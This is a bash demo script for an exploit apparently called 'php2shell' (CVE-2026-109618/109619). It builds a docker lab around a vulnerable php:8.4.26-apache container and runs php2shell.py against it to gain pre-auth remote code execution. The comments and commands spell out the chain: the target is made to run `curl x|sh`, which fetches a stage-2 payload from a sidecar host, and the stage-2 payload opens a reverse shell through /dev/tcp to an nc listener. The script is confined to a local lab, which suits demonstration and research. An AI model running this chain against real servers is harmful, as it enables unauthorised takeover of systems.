#!/usr/bin/env bash
# demo.sh - fresh vulnerable php:8.4.26-apache -> interactive reverse shell.
#
# Two-pane flow suitable for a terminal GIF:
#   pane 1 (you)  : nc -l -p 4444
#   pane 2 (this) : ./demo.sh
# When the exploit lands, type commands in pane 1 and see output stream back.
#
# Topology (all in docker, no host privileges):
#   target  (php:8.4.26-apache, hits "/"->index.php, served on host :8780)
#   sidecar (python:3-slim, hostname "x" on a user-defined docker net)
# "x" resolves inside the target via docker's embedded DNS -> fetches
# stage2.sh via `curl x|sh` (9 bytes, fits the 14-byte op cap).
# Stage 2 (arbitrary length) re-execs through bash to `/dev/tcp/h/4444`;
# "h" resolves to the docker host via --add-host=h:host-gateway, so the
# shell callback lands in the host's nc listener.
set -e

NET="${NET:-p2s-demo}"
TARGET="${TARGET:-p2s-target}"
SIDE="${SIDE:-p2s-side}"
IMG="${IMG:-php:8.4.26-apache}"
PORT_FWD="${PORT_FWD:-8780}"
LPORT="${LPORT:-4444}"

cleanup() {
    docker rm -f "$TARGET" "$SIDE" >/dev/null 2>&1 || true
    docker network rm "$NET" >/dev/null 2>&1 || true
}
trap cleanup EXIT INT TERM
cleanup

cat <<EOF
+---------------------------------------------------------------+
| php2shell demo  (CVE-2026-109618 / CVE-2026-109619)           |
| Fresh container, pre-auth RCE, interactive reverse shell.     |
|                                                               |
| Before continuing, start a listener in another pane:          |
|     nc -l -p ${LPORT}                                              |
+---------------------------------------------------------------+
EOF
read -r -p "Press enter when nc is listening on :${LPORT}... " _

echo "+ docker network create $NET"
docker network create "$NET"

echo
echo "+ docker run -d --name $SIDE --network $NET --hostname x python:3-slim \\"
echo "    python3 serve_stage2.py --revshell h:${LPORT} --port 80"
docker run -d --name "$SIDE" --network "$NET" --hostname x \
    -v "$PWD":/w -w /w python:3-slim \
    python3 serve_stage2.py --revshell "h:${LPORT}" --port 80

echo
echo "+ docker run -d --name $TARGET --network $NET --add-host h:host-gateway \\"
echo "    -p ${PORT_FWD}:80 $IMG"
docker run -d --name "$TARGET" --network "$NET" \
    --add-host "h:host-gateway" \
    -p "${PORT_FWD}:80" \
    -v "$PWD/demo.ini:/usr/local/etc/php/conf.d/zz-demo.ini:ro" \
    "$IMG"
# php:*-apache has an empty docroot; drop a one-line stub so Apache dispatches
# to mod_php (rfc1867 runs during multipart parsing but only if the request
# reaches PHP in the first place).
docker exec "$TARGET" sh -c 'echo "<?php // demo stub" > /var/www/html/index.php'
until curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:${PORT_FWD}/" | grep -qE '^200$'; do sleep 0.3; done

echo "[*] target up at http://127.0.0.1:${PORT_FWD}"
echo

python3 -u "$(dirname "$0")/php2shell.py" \
    -u "http://127.0.0.1:${PORT_FWD}" \
    --container "$TARGET" \
    --stage2 x \
    --timeout 30 || true

echo
echo "[*] exploit finished. If the shell landed, your nc pane is interactive."
echo "[*] press enter here to tear down the lab."
read -r _
